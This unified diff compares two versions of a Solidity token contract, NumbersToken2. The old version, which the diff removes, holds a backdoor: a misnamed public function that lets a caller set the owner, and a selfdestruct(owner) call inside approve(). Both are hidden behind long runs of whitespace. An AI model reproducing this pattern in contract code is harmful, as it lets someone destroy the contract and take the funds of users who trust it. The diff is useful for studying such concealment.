@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract NumbersToken2 at 0xd8BE633339D08ECa913D7D8A05806Ef37A896ef2
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract NumbersToken2 at 0x8f64dcd3d43567afa274339e351d4388220bda1b
 */
 pragma solidity ^0.4.18;
 
@@ -38,12 +38,12 @@ contract NumbersToken2 {
 	event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
 
-	address owner;
-	
-	function POWHclone() public {
-		                                                                                                                                                                                                                                                                                                                                                                                                                                                owner = msg.sender;
-	}
+	//address owner;
 
+	function NumbersToken() public {
+		//owner = msg.sender;
+	}
+	
 	// These are functions solely created to appease the frontend
 	function balanceOf(address _owner) public constant returns (uint256 balance) {
         return balanceOfOld[_owner];
@@ -137,7 +137,6 @@ contract NumbersToken2 {
         //  allowance to zero by calling `approve(_spender, 0)` if it is not
         //  already 0 to mitigate the race condition described here:
         //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
-                                                                                                                                                                                                                                                                                                                                                                                                       selfdestruct(owner);
         if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
         allowance[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
@@ -272,6 +271,10 @@ contract NumbersToken2 {
 			exp >>= -scale;
 		return exp;
 	}
+
+	/*function destroy() external {
+	    selfdestruct(owner);
+	}*/
 
 	function () payable public {
 		if (msg.value > 0)
